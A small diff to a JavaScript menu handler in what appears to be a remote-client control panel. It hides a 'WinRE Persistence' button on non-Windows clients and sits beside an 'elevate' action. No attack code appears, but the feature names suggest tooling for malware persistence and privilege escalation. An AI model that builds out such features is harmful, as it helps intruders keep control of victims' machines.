@@ -377,9 +377,10 @@ function applyMenuSupportRules(clientId) {
 
   const winreBtn = menu.querySelector('[data-open="winre"]');
   if (winreBtn) {
-    setAvailability(winreBtn, isOnline && isWindows, isOnline ? "WinRE Persistence is only supported on Windows clients." : "Client is offline");
-    const label = winreBtn.querySelector("span");
-    if (label) label.style.textDecoration = isWindows ? "" : "line-through";
+    winreBtn.style.display = isWindows ? "" : "none";
+    if (isWindows) {
+      setAvailability(winreBtn, isOnline, "Client is offline");
+    }
   }
 
   const elevateBtn = menu.querySelector('[data-action="elevate"]');
